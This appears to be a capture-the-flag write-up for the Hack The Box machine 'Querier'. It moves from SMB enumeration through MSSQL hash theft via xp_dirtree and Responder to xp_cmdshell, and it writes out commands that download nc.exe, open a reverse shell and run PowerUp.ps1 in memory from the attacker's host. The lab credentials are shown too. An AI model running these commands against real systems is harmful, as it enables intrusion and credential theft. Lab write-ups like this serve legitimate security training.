---
title: "Hack The Box - Querier"
tags: [windows,medium,SMB , xslx , xslm , mssql , xp_dirtree , responder , PowerUp.ps1]
categories: HackTheBox-Active-Directory
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled.png)

## NMAP

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%201.png)

## SMB Enumeration

⇒ In Reports SMB Share we find an xlmsm file

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%202.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%203.png)

⇒ We found password in **`xl/vbaProject.bin`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%204.png)

Pwd : **PcwTWTHRwryjc$c6**

User : **Reporting**

→ We were able to login to MSSQL using these credentials

### Exploiting MSSQL :

**mssqlclient.py -windows-auth querier/reporting@10.10.10.125**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%205.png)

⇒ Stealing hash using xp_dirtree and responder :

→ We started responder and ran the following command in MSSQL :

**`xp_dirtree '\\10.10.14.4\enox'`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%206.png)

→ Cracked the hash and got credentials for mssql-svc user :

**mssql-svc : corporate568**

⇒ Logged in MSSQL using this user and enabled xp_cmdshell and popped a shell :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%207.png)

**enable_xp_cmdshell**

**xp_cmdshell "whoami"**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%208.png)

**xp_cmdshell "curl [http://10.10.14.4/nc.exe](http://10.10.14.4/nc.exe) -o C:\Windows\System32\spool\drivers\color\nc.exe"**

**xp_cmdshell "C:\Windows\System32\spool\drivers\color\nc.exe 10.10.14.4 1234 -e cmd.exe"**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%209.png)

### Privilege Escalation to Root

⇒ We ran PowerUp and got Administrator user credentials :

**`powershell.exe "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.4/PowerUp.ps1');invoke-allchecks"`**

**Administrator : MyUnclesAreMarioAndLuigi!!1!**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Querier%20Box%20c983bcce7c9d413e9676c3814c3b3a89/Untitled%2010.png)

